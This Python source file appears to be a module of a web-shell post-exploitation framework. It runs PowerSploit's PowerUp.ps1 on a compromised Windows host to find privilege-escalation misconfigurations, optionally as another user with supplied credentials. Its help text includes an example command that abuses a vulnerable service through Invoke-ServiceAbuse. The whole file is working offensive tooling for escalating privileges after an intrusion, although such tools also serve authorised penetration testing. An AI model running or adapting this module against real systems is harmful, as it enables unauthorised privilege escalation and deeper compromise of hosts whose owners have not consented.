from core.Module import Module, ModuleException
from modules.invoke_ps_module import Invoke_ps_module
from modules.invoke_ps_module_as import Invoke_ps_module_as
import traceback


class PrivescPowerupModuleException(ModuleException):
    pass


class Privesc_powerup(Module):
    _exception_class = PrivescPowerupModuleException
    short_help = "Run Powerup module to assess all misconfiguration for privesc"
    complete_help = r"""
        Author:     @PowerShellMafia
        Link:       https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1
        
        
        This module run the Powerup.ps1 script in order to find all possible misconfiguration that can
        lead to a privilege escalation.
        The output of this module will be just informative, no automatic privesc exploitation will be performed.
        Running this module with different users can lead to different results. So it's possible to specify 
        a user to runas this module.
        If no users are provided this module will run under the application pool running user.
        
        
        Usage:
            #privesc_powerup [username] [password] [domain] [custom_command]
        
        Positional arguments:
            username                username of the user to runas the process
            password                password of the user to runas the process
            domain                  domain of the user to runas the process
            custom_command          the command to run within the module
                                    Default: ';Invoke-PrivescAudit -Format List'
                                        
        Examples:
            Run powerup as the current user
                #privesc_powerup
            Run powerup as a specific local user
                #privesc_powerup 'user1' 'password1'
            Run powerup as a specific domain user
                #privesc_powerup 'user1' 'password1' 'domain'
            Run powerup with a custom command, i.e. abusing a service misconfiguration
                #privesc_powerup '' '' '' ';Invoke-ServiceAbuse -Name "VulnSvc"'

    """

    __default_username = ''
    __default_password = ''
    __default_domain = ''
    __default_custom_command = ';Invoke-PrivescAudit -Format List'

    def __init__(self, password, channel_enc_mode, module_settings, request_object):
        Module.__init__(self, password, channel_enc_mode, module_settings, request_object)
        self.invoke_ps_module_object = Invoke_ps_module(password, channel_enc_mode, module_settings, request_object)
        self.invoke_ps_as_module_object = Invoke_ps_module_as(password, channel_enc_mode, module_settings, request_object)

    def __parse_run_args(self, args):
        args_parser = {k: v for k, v in enumerate(args)}
        username = args_parser.get(0, self.__default_username)
        password = args_parser.get(1, self.__default_password)
        domain = args_parser.get(2, self.__default_domain)
        custom_command = args_parser.get(3, self.__default_custom_command)
        return username, password, domain, custom_command

    def run(self, args):
        try:
            username, password, domain, custom_command = self.__parse_run_args(args)
            if username == '' and password == '':
                response = self.invoke_ps_module_object.run(['PowerUp.ps1', custom_command])
            else:
                response = self.invoke_ps_as_module_object.run(
                    ['PowerUp.ps1', username, password, custom_command, domain])
            parsed_response = self._parse_response(response)
        except ModuleException as module_exc:
            parsed_response = str(module_exc)
        except Exception:
            parsed_response = '{{{' + self._exception_class.__name__ + '}}}' + '{{{PythonError}}}\n' +\
                              str(traceback.format_exc())
        return parsed_response
